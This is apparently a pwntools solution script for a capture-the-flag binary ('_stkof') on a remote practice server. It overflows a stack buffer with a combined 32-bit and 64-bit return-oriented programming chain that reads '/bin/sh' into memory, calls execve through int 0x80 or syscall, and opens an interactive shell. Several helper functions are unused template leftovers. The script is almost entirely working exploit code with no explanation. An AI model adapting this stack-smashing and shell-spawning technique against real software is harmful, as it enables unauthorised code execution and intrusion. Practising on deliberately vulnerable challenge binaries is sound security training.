from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv
from subprocess import check_output

s = lambda data: p.send(str(data))
sa = lambda delim,data: p.sendafter(delim,str(data))
sl = lambda data: p.sendline(str(data))
sla = lambda delim,data: p.sendlineafter(delim,str(data))
r = lambda num=4096: p.recv(num)
ru = lambda delims,drop=True: p.recvuntil(delims,drop)
uu64 = lambda data: u64(data.ljust(8,'\0'))
leak = lambda name,addr: log.success('{} = {:#x}'.format(name, addr))

def leak_libc(func,addr,elf=None):
	if elf:
		libc = elf
		base = addr-libc.sym[func]
		leak('base',base)
		system = base+libc.sym['system']
	else:
		libc = LibcSearcher(func,addr)
		base = addr-libc.dump(func)
		leak('base',base)
		system = base+libc.dump('system')

	return (base,libc,system)

context.log_level = 'DEBUG'
binary = './_stkof'
context.binary = binary
elf = ELF(binary,checksec=False)
libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
#libc_path = './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'
#env={'LD_PRELOAD':libc_path}
libc = ELF(libc_path,checksec=False)
one = map(int, check_output(['one_gadget','--raw',libc_path]).split(' '))
p = remote('node3.buuoj.cn',25758) if argv[1]=='r' else process(binary)

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,4,3,2
def add(name='a'*8,content='b'*0x70):
	sla('choice :',_add)
	sa('name',name)
	sa('sex','W')
	sa('tion',content)

def free(index):
	sla('choice :',_free)
	sla('index :',index)

def edit(index,content):
	sla('choice :',_edit)
	sla(':',index)
	sa('sex?','N')
	sa('tion',content)

def show(index):
	sla('choice :',_show)
	sla(':',index)

# start
pop_eax = 0x80a8af6
pop_dcb = 0x806e9f1
int_80 = 0x80495a3
data86 = 0x80d7000
read = 0x806c8e0
add_esp_20 = 0x80a69f2

offset86 = 0x20-0xc # esp+0xc
chain86 = [
	'a'*offset86,
	read,
	pop_dcb,0,data86,0x8,
	pop_dcb,0,0,data86,
	pop_eax,0xb,
	int_80
]
payload86 = flat(chain86,word_size=32)

pop_rax = 0x43b97c
pop_rdi = 0x4005f6
pop_rsi = 0x405895
pop_rdx = 0x43b9d5
syscall = 0x461645
data64 = 0x6a4e40
add_rsp_80 = 0x40cd17

offset64 = 0x80-len(payload86) # rsp+0x0
print hex(offset64)
chain64 = [
	'a'*offset64,
	pop_rax,0,pop_rdi,0,
	pop_rsi,data64,pop_rdx,0x100,
	syscall,
	pop_rax,59,pop_rdi,data64,
	pop_rsi,0,pop_rdx,0,
	syscall
]
payload64 = flat(chain64,word_size=64)

payload = 'a'*0x110 + (p32(add_esp_20)+'aaaa') + p64(add_rsp_80) + payload86 + payload64

sa('?',payload)
s('/bin/sh\x00')
# end

p.interactive()